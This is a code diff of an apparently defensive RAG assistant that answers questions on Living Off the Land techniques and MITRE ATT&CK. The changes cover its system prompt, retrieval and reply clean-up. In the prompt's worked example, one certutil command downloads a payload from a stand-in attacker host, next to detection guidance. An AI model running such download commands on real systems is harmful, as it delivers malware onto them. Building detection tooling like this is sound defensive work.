@@ -18,51 +18,62 @@ CHROMA_HOST     = "localhost"
 CHROMA_PORT     = 8000
 EMBED_MODEL     = "BAAI/bge-small-en-v1.5"
 RERANK_MODEL    = "cross-encoder/ms-marco-MiniLM-L-6-v2"
-LLM_MODEL       = "llama3.1:8b"
+LLM_MODEL       = "deepseek-r1:14b"
 TOP_K           = 5
 CANDIDATES      = 25
 VAULT_BASE      = r"D:\GARUDA\obsidian_vault\MITRE_ATTACK"
 # ================================
 
-SYSTEM_PROMPT = """You are a LOTL (Living Off the Land) cybersecurity assistant.
+SYSTEM_PROMPT = """You are GARUDA, a defensive cybersecurity assistant specializing in Living Off the Land (LOTL), LOLBins, detection engineering, and MITRE ATT&CK.
 
-You will receive CONTEXT (chunks from a knowledge base) and a QUESTION.
-Use information FROM THE CONTEXT to answer. The context may include commands,
-detection logic, mitigations, and scenario descriptions.
+Answer format (ALWAYS, no exceptions):
 
-If a chunk contains commands, code blocks, or detection patterns, USE THEM in
-your answer. Do not skip them because they aren't in a specific format.
+**Summary**
+One or two sentences answering the question directly.
 
-Sections in context may be labeled 'Detection', 'Detection Logic', '## Detection Logic', 
-or simply appear as text with keywords like 'monitor', 'alert', 'flag', 'detect', 
-'YARA rule', 'Sigma rule'. Treat any of these as detection content.
+## Details
+Bullets, commands, tables. Use `##` headers to organize.
 
-When the context contains Sigma rules with 'detection:' blocks, extract and list
-the exact detection conditions (field names, operators, values). Do not summarize.
+## Detection
+Concrete detection guidance: Sigma rule names, Event IDs, command-line patterns.
 
-Structure every answer EXACTLY:
-**Summary:** One sentence.
-**Commands:** Command examples extracted from context VERBATIM. If truly none: "Not in context."
-**Detection:** Specific indicators from context. If truly none: "Not in context."
-**Mitigation:** Specific restrictions from context. If truly none: "Not in context."
+## References
+- [Note title] — collection/note_name
+- [Another note] — collection/note_name
 
-For comparison queries ("vs", "versus", "compare", "difference between"):
-- Only cite command examples that appear in the context.
-- If only one entity's commands are in context, note that for the other.
-- Table columns: Summary | Command example | MITRE ID | Detection approach | Use case.
-- Each row should compare ONE aspect, not repeat entities.
+Hard rules:
+1. Synthesize a NEW answer. Do NOT copy raw notes verbatim.
+2. NEVER output [^fn1], YAML frontmatter, [[wikilinks]], or `tags:` blocks.
+3. NEVER invent URLs. If a URL is malformed, omit it.
+4. If context is insufficient, say so. Do not hallucinate.
+5. Stay in scope: LOTL, LOLBins, GTFOBins, MITRE ATT&CK, Sigma, CTI.
+6. Do not echo the user's question back.
 
-RULES:
-- Never invent commands, flags, tool names, or MITRE IDs.
-- NEVER give generic advice. Do NOT say "apply patches", "update software",
-  "monitor suspicious activity", "restrict privileges", "use secure boot",
-  "regular system scans", "implement security controls", "restrict access".
-- Only cite SPECIFIC restrictions from context (AppLocker rules, Sysmon Event IDs,
-  specific GPO settings, specific registry paths).
-- If the context has no specific mitigations, say "No specific mitigation in context."
-- Cite sources with [Source: filename].
-- Keep answers under 300 words.
+Example:
+
+User: How do attackers use certutil?
+
+**Summary**
+certutil.exe is a signed Windows utility abused for payload download and base64 decoding — a classic LOTL downloader.
+
+## Details
+- Download: `certutil -urlcache -split -f http://attacker/payload.exe payload.exe`
+- Decode: `certutil -decode encoded.txt payload.exe`
+
+## Detection
+- Sigma: `proc_creation_win_certutil_download`
+- Event ID 4688: certutil.exe with `-urlcache` and network egress to non-Microsoft hosts.
+
+## References
+- certutil — lolbins/certutil
+- T1105 Ingress Tool Transfer — MITRE_ATTACK/techniques/T1105
 """
+
+# Post-processors applied to every model reply
+FOOTNOTE_RE = re.compile(r"\[\^[^\]]+\]")
+WIKILINK_RE = re.compile(r"\[\[([^\]|]+)(?:\|([^\]]+))?\]\]")
+YAML_FM_RE  = re.compile(r"^---\s*\n.*?\n---\s*\n", re.DOTALL)
+
 
 # ---------- Load malware & tool names dynamically ----------
 def load_names():
@@ -256,7 +267,7 @@ def retrieve(question, collection_name, entity, top_k=TOP_K, candidates=CANDIDAT
             print(f"   [ID filter failed: {e}]")
 
     # Filename match for specific malware/tool names (exact match)
-    if entity and collection_name in ("malware", "tools"):
+    if entity and collection_name in ("malware", "tools", "lolbins", "gtfobins"):
         try:
             results = coll.get(
                 where={"filename": entity},
@@ -268,8 +279,9 @@ def retrieve(question, collection_name, entity, top_k=TOP_K, candidates=CANDIDAT
             if f_docs:
                 top = list(zip(f_docs, f_metas))[:top_k]
                 return [t[0] for t in top], [t[1] for t in top]
-        except Exception:
-            pass  # silent fallback to semantic search
+        except Exception as e:
+            # silent fallback to semantic search, but log so we notice schema drift
+            print(f"   [filename lookup skipped: {e}]")
 
     # Semantic search + rerank
     n_fetch = max(candidates, 50) if collection_name == "campaigns" else candidates
@@ -285,12 +297,13 @@ def retrieve(question, collection_name, entity, top_k=TOP_K, candidates=CANDIDAT
     scores = reranker.predict(pairs)
 
     scored = []
+    ent_l = entity.lower() if entity else None
     for doc, meta, score in zip(docs, metas, scores):
         bonus = 0.0
-        if entity:
-            if entity in meta.get("source", "").lower():
+        if ent_l:
+            if ent_l in meta.get("source", "").lower():
                 bonus += 5.0
-            if entity in doc.lower():
+            if ent_l in doc.lower():
                 bonus += 1.0
         scored.append((score + bonus, doc, meta))
 
@@ -338,6 +351,34 @@ def retrieve(question, collection_name, entity, top_k=TOP_K, candidates=CANDIDAT
 
     return [t[1] for t in picked], [t[2] for t in picked]
 
+
+def strip_thinking(text: str) -> str:
+    """Remove <think>...</think> blocks and orphan tags from DeepSeek-R1 output."""
+    text = re.sub(r"<think>.*?</think>", "", text, flags=re.DOTALL)
+    # Orphaned opening OR closing tags (model sometimes truncates one side)
+    text = re.sub(r"</?think>", "", text)
+    return text.strip()
+
+
+def strip_bad_urls(text: str) -> str:           # ← NEW, insert here
+    """Remove or repair malformed URLs from the reply."""
+    text = re.sub(r"https?://\S*(?:\.\.\.|\[…\]|…)\S*", "", text)
+    text = re.sub(r"https?://(?=\s|$)", "", text)
+    text = re.sub(r"(https?://\S+)[.,;:!?](?=\s|$)", r"\1", text)
+    return text
+
+def clean_reply(text: str) -> str:
+    """Apply all post-processors to a raw model reply."""
+    text = strip_thinking(text)
+    text = FOOTNOTE_RE.sub("", text)         # kill [^fn1] leftovers
+    # Unwrap Obsidian wikilinks: [[target|label]] -> label, [[target]] -> target
+    text = WIKILINK_RE.sub(lambda m: m.group(2) or m.group(1), text)
+    text = strip_bad_urls(text)          # ← add this line
+    text = re.sub(r"[ \t]+\n", "\n", text)   # trim trailing spaces
+    text = re.sub(r"\n{3,}", "\n\n", text)   # collapse blank lines
+    return text.strip()
+
+
 def ask_llm(question, context, collection_used):
     user_prompt = f"""Retrieved from collection '{collection_used}'.
 
@@ -357,8 +398,16 @@ Answer using only the context above."""
             {"role": "system", "content": SYSTEM_PROMPT},
             {"role": "user", "content": user_prompt},
         ],
+        options={"num_predict": 4096},
     )
-    return response["message"]["content"]
+
+    msg = getattr(response, "message", None) or response["message"]
+    content  = getattr(msg, "content",  "") or ""
+    thinking = getattr(msg, "thinking", "") or ""
+    
+    raw = content if content.strip() else thinking
+
+    return clean_reply(raw)
 
 
 def build_context(docs, metas):
@@ -368,40 +417,155 @@ def build_context(docs, metas):
         parts.append(f"[Chunk {i}] source={src}\n{doc}")
     return "\n\n---\n\n".join(parts)
 
+REFERENCES_HEADER_RE = re.compile(
+    r"^[ \t]*[#*_> \t]*(?:references|sources)[ \t*_:]*$",
+    re.IGNORECASE | re.MULTILINE,
+)
 
-def answer(question):
+def ensure_references(reply: str, metas) -> str:
+    """If the model didn't emit a References section, append one built
+    from the actual retrieved sources. Deterministic, always accurate."""
+    if not reply:
+        return reply
+    if REFERENCES_HEADER_RE.search(reply):
+        return reply  # model provided one — trust it
+
+    seen, lines = set(), []
+    for meta in metas:
+        src = meta.get("source", "").strip()
+        if src and src not in seen:
+            seen.add(src)
+            lines.append(f"- {src}")
+
+    if not lines:
+        return reply
+
+    return reply.rstrip() + "\n\n## References\n" + "\n".join(lines) + "\n"
+
+def rewrite_query(question, history):
+    """
+    Rewrite a follow-up question into a standalone search query using
+    conversation history. Returns the original if no rewrite is needed.
+    """
+    if not history:
+        return question
+
+    # Skip only if the query already contains a specific tool name or technique ID
+    # (true standalone queries). Do NOT skip topic-switch phrases like "now tell me about X"
+    if re.search(r"\bT\d{4}(\.\d{3})?\b", question):
+        return question
+
+    # Build short conversation context
+    convo = "\n".join(
+        f"{m['role'].capitalize()}: {m['content'][:150]}"
+        for m in history[-4:]
+    )
+
+    prompt = f"""You are a query rewriter. Rewrite the user's latest message into
+a short standalone search query for a cybersecurity knowledge base.
+
+Rules:
+- Output ONLY the rewritten query — no prefix, no quotes, no explanation.
+- Keep it under 20 words.
+- Include the tool/technique name from context if the message uses "that", "it", or "this".
+
+Conversation:
+{convo}
+
+Latest message: {question}
+
+Rewritten query:"""
+
+    try:
+        resp = ollama.chat(
+            model="llama3.1:8b",
+            messages=[{"role": "user", "content": prompt}],
+            options={"num_predict": 40, "temperature": 0.1},
+        )
+        msg = getattr(resp, "message", None) or resp["message"]
+        rewritten = (getattr(msg, "content", "") or "").strip()
+        if not rewritten:
+            rewritten = (getattr(msg, "thinking", "") or "").strip()
+
+        # Take the last non-empty line (LLM sometimes adds a preamble)
+        lines = [ln.strip() for ln in rewritten.split("\n") if ln.strip()]
+        if lines:
+            rewritten = lines[-1]
+
+        # Strip common prefixes and quotes
+        rewritten = re.sub(
+            r"^(?:rewritten query|standalone query|query|rewritten)[:\s]*",
+            "", rewritten, flags=re.I,
+        )
+        rewritten = rewritten.strip('"\'' + "`").strip()
+
+        # Debug line so we can see what it produced
+        print(f"   [rewrite] '{question}' -> '{rewritten}'")
+
+        if 3 < len(rewritten) < 200:
+            return rewritten
+        else:
+            print(f"   [rewrite REJECTED] len={len(rewritten)}")
+    except Exception as e:
+        print(f"   [query rewrite failed: {e}]")
+
+    return question
+
+def answer(question, verbose=True):
+    """
+    Run the full pipeline. Prints progress when verbose.
+    Returns (reply_text, sources_list) or (None, []) on out-of-scope / no results.
+    """
     collection, entity = classify_query(question)
-    print(f"\n🔍 Question: {question}")
+    if verbose:
+        print(f"\n🔍 Question: {question}")
 
     if collection == "OUT_OF_SCOPE":
-        print("❌ This assistant only answers LOTL / cybersecurity questions.")
-        return
+        msg = "❌ This assistant only answers LOTL / cybersecurity questions."
+        if verbose:
+            print(msg)
+        return None, []
 
-    print(f"📂 Collection: {collection}" + (f"  |  Entity: {entity}" if entity else ""))
-    print("⏳ Retrieving...")
+    if verbose:
+        print(f"📂 Collection: {collection}" + (f"  |  Entity: {entity}" if entity else ""))
+        print("⏳ Retrieving...")
 
     k = 8 if collection == "campaigns" else TOP_K
     docs, metas = retrieve(question, collection, entity, top_k=k)
     if not docs:
-        print("❌ No results found.")
-        return
+        if verbose:
+            print("❌ No results found.")
+        return None, []
 
-    print(f"✓ Retrieved {len(docs)} chunks (post-rerank)")
-    print("🧠 Generating answer...\n")
+    if verbose:
+        print(f"✓ Retrieved {len(docs)} chunks (post-rerank)")
+        print("🧠 Generating answer...\n")
 
     context = build_context(docs, metas)
     reply = ask_llm(question, context, collection)
+    reply = ensure_references(reply, metas)      # ← new
 
-    print("=" * 72)
-    print(reply)
-    print("=" * 72)
-    print("\n📚 Sources:")
+    if verbose:
+        print("=" * 72)
+        print(reply)
+        print("=" * 72)
+        print("\n📚 Sources:")
+        seen = set()
+        for meta in metas:
+            src = meta.get("source", "unknown")
+            if src not in seen:
+                seen.add(src)
+                print(f"  - {src}")
+
+    sources = []
     seen = set()
     for meta in metas:
         src = meta.get("source", "unknown")
         if src not in seen:
             seen.add(src)
-            print(f"  - {src}")
+            sources.append(src)
+
+    return reply, sources
 
 
 def interactive():
